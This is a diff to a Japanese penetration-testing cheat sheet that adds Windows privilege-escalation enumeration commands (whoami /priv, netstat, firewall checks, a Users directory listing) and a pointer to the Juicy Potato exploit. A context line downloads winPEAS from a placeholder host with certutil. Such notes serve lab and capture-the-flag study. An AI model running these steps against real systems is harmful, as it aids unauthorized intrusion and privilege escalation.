@@ -1004,6 +1004,32 @@ linpeas.shなどでps auxだけでは確認できないものも確認できる
 [その他資料: HackTricks](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
 
 
+```
+PS C:\> whoami
+PS C:\> whoami /priv # exploitable privileges?
+PS C:\> whoami /groups # administrator?
+
+ex: 
+whoami /priv で、
+SeImpersonatePrivilege   enabled      // Impersonate a client after authentication   
+
+→  Juicy Potato 
+
+
+```
+
+
+
+```
+
+PS C:\> hostname
+PS C:\> ipconfig /all ; route print ; arp -a # network information
+PS C:\> netstat -anto | Select-String "listening" # check for services on loopback
+PS C:\> netstat -anto | Select-String "established" # check outgoing connections
+PS C:\> netsh advfirewall show allprofiles # firewall settings
+
+
+```
 
 systeminfo で、OS name, OS version をcheck.
 
@@ -1576,6 +1602,9 @@ certutil -urlcache -f http://ip:8000/winPEASx64.exe winPEASx64.exe
 
 ```
 where /r . user.txt
+
+tree /f /a \Users
+
 
 ```
 
